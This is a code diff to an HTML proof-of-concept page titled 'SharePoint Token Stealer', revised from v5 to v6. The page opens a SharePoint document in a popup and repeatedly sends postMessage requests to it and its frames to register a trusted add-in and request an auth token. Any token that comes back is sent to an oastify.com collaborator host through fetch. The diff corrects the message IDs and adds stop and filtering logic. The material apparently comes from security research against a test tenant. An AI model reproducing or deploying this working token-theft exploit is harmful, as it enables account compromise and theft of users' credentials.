@@ -2,47 +2,68 @@
 <html>
 
 <head>
-    <title>SharePoint PoC - Token Stealer v5 (HTTPS Required)</title>
+    <title>SharePoint PoC - Token Stealer v6 (FIXED)</title>
     <style>
         body {
-            font-family: sans-serif;
+            font-family: 'Segoe UI', sans-serif;
             padding: 20px;
-            background: #fff;
+            background: #f4f4f4;
         }
 
         .success {
-            color: green;
+            color: #155724;
+            background-color: #d4edda;
+            border-color: #c3e6cb;
+            padding: 15px;
+            border: 1px solid transparent;
+            border-radius: 4px;
             font-weight: bold;
-            background: #e0ffe0;
-            padding: 10px;
-            border: 1px solid green;
         }
 
         .error {
-            color: red;
-            font-weight: bold;
+            color: #721c24;
+            background-color: #f8d7da;
+            border-color: #f5c6cb;
+            padding: 10px;
+            border: 1px solid transparent;
+            border-radius: 4px;
         }
 
         .info {
-            color: blue;
+            color: #004085;
+            background-color: #cce5ff;
+            border-color: #b8daff;
+            padding: 10px;
+            border: 1px solid transparent;
+            border-radius: 4px;
         }
 
         #log {
-            background: #f8f8f8;
-            border: 1px solid #ccc;
+            background: #1e1e1e;
+            color: #d4d4d4;
+            border: 1px solid #333;
             padding: 10px;
             height: 500px;
             overflow-y: scroll;
-            font-family: monospace;
-            font-size: 12px;
+            font-family: 'Consolas', monospace;
+            font-size: 13px;
+            margin-top: 10px;
         }
 
         button {
             padding: 12px 24px;
-            margin: 5px;
+            margin: 5px 0;
             cursor: pointer;
             font-size: 16px;
             font-weight: bold;
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 3px;
+        }
+
+        button:hover {
+            background-color: #005a9e;
         }
 
         .warning {
@@ -53,40 +74,30 @@
             border-radius: 5px;
             margin-bottom: 20px;
         }
-
-        code {
-            background: #eee;
-            padding: 2px 5px;
-            border-radius: 3px;
-        }
     </style>
 </head>
 
 <body>
-    <h1>SharePoint Token Stealer - v5 (HTTPS)</h1>
+    <h1>SharePoint Token Stealer - v6 (Corrected IDs)</h1>
 
     <div class="warning">
-        <strong>CRITICAL REQUIREMENT:</strong> This PoC MUST be served via <code>HTTPS</code> (e.g., ngrok, GitHub
-        Pages, Vercel).
+        <strong>CRITICAL REQUIREMENT:</strong> This PoC MUST be served via <code>HTTPS</code>.
         <br>
-        If you run it from <code>file://</code> or <code>http://localhost</code>, SharePoint will reject it because the
-        validator enforces <code>c.protocol === 'https:'</code>.
+        1. Upload this file to <strong>GitHub Pages, Vercel, or Netlify</strong>.
+        <br>
+        2. OR run local text file via <code>ngrok http 80</code>.
     </div>
 
-    <button onclick="startExploit()">1. Open Target (Popup)</button>
-    <button onclick="startSpraying()">2. Start Attack (After Load)</button>
+    <button onclick="startExploit()">🚀 Launch Attack</button>
+    <button onclick="stop()">Stop</button>
 
-    <h3>Debug Log:</h3>
+    <h3>Log:</h3>
     <div id="log"></div>
 
     <script>
         const targetUrl = "https://shiscolinotests-my.sharepoint.com/personal/shiscolino_shiscolinotests_onmicrosoft_com/_layouts/15/Doc.aspx?sourcedoc={aafd58b8-f1a2-439e-94f0-d4ac217eea09}&action=interactivepreview";
-
-        // Use a real-looking UUID to bypass potential regex checks
         const exploitId = "a1b2c3d4-e5f6-7890-a1b2-c3d4e5f67890";
-
-        // User's Oastify URL
-        const attackerOastify = "https://upnla00uacv108xe6qjzkr42ut0kolca.oastify.com/";
+        const attackerOastify = "https:/nb2ewtmnw5hum1j7sj5s6kqvgmmdafy4.oastify.com/";
 
         let popup = null;
         let intervals = [];
@@ -97,28 +108,33 @@
         }
 
         function startExploit() {
-            log("Opening target in popup...", "info");
+            log("Opening target...", "info");
             popup = window.open(targetUrl, "target", "width=1000,height=800");
 
-            // Auto-start spraying after 6 seconds
+            // Wait for boot (6s) then start
             setTimeout(() => {
-                log("Auto-starting attack sequence...", "info");
+                log("Starting Message Spray...", "info");
                 startSpraying();
             }, 6000);
         }
 
-        function startSpraying() {
-            log("<b>Starting Spray Loop...</b>", "info");
+        function stop() {
+            intervals.forEach(clearInterval);
+            intervals = [];
+            log("Stopped.");
+        }
 
+        function startSpraying() {
+            // CORRECTED MESSAGE IDs found in analysis
             const msgRegister = {
                 MessageId: "AddinTrustedOrigin",
                 AddinTrustId: exploitId
             };
 
             const msgRequest = {
-                MessageId: "GetAuthToken",
+                MessageId: "App_GetAuthToken", // WAS "GetAuthToken" -> FIXED TO "App_GetAuthToken"
                 AddinTrustId: exploitId,
-                Resource: window.location.origin, // Must be HTTPS!
+                Resource: window.location.origin,
                 Values: {
                     AddinTrustId: exploitId,
                     Resource: window.location.origin
@@ -128,12 +144,12 @@
             const jsonRegister = JSON.stringify(msgRegister);
             const jsonRequest = JSON.stringify(msgRequest);
 
-            // Loop 1: Register (Every 1s)
+            // Spray Register constantly
             intervals.push(setInterval(() => {
                 spray(jsonRegister);
             }, 1000));
 
-            // Loop 2: Request Token (Every 1s, offset by 500ms)
+            // Spray Request constantly (offset)
             setTimeout(() => {
                 intervals.push(setInterval(() => {
                     spray(jsonRequest);
@@ -144,10 +160,8 @@
         function spray(payload) {
             if (!popup || popup.closed) return;
 
-            // Target 1: Top
             try { popup.postMessage(payload, "*"); } catch (e) { }
 
-            // Target 2: Deep Spray (Frames & Subframes)
             if (popup.frames.length > 0) {
                 for (let i = 0; i < popup.frames.length; i++) {
                     try { popup.frames[i].postMessage(payload, "*"); } catch (e) { }
@@ -161,32 +175,34 @@
         }
 
         window.addEventListener("message", (e) => {
-            let raw = e.data;
-            if (typeof raw === "object") raw = JSON.stringify(raw);
+            let data = e.data;
+            if (typeof data === "object") {
+                try { data = JSON.stringify(data); } catch (e) { }
+            }
+            if (typeof data !== "string") return;
 
-            // Filter noise
-            if (raw.includes("AddinTrustedOrigin") || raw.includes("GetAuthToken")) return;
+            // FILTER NOISE (Metamask, React devtools, etc)
+            if (data.includes("metamask") || data.includes("react-devtools")) return;
+            // FILTER SELF
+            if (data.includes("AddinTrustedOrigin") || data.includes("App_GetAuthToken")) return;
 
-            if (raw.includes("Token")) {
-                log("!!! TOKEN RECEIVED !!! " + raw.substring(0, 100) + "...", "success");
-                alert("TOKEN STOLEN! Check Oastify.");
+            // SUCCESS CHECK - Look for Token Response
+            // Response ID is usually "Host_SetAuthToken" or just contains "Token"
+            if (data.includes("Token") || data.includes("Host_SetAuthToken") || data.includes("AccessToken")) {
 
-                // Exfiltrate
-                try {
-                    const data = JSON.parse(raw);
-                    const token = data.Values ? data.Values.Token : data.Token;
-                    fetch(attackerOastify + "?stolen_token=" + encodeURIComponent(token), { mode: 'no-cors' });
-                } catch (e) {
-                    log("Error exfiltrating: " + e.message, "error");
-                }
+                // IGNORE "undefined" tokens or empty strings
+                if (data.includes('"Token":""') || data.includes('"Token":null')) return;
 
-                // Stop spamming once successful
-                intervals.forEach(clearInterval);
+                stop();
+                log("!!! TOKEN RECEIVED !!! " + data.substring(0, 150) + "...", "success");
+                alert("TOKEN STOLEN!");
 
-            } else if (raw.includes("accessDenied") || raw.includes("error")) {
-                log("Received Error/AccessDenied: " + raw, "error");
+                fetch(attackerOastify + "?stolen_data=" + encodeURIComponent(data), { mode: 'no-cors' });
+            } else if (data.includes("accessDenied")) {
+                log("Access Denied. HTTPS Check: " + window.location.protocol, "error");
             } else {
-                // log("RX: " + raw.substring(0, 50)); // specific debugging only
+                // Keep log clean, only show relevant messages
+                if (data.length < 500) log("RX: " + data);
             }
         });
     </script>
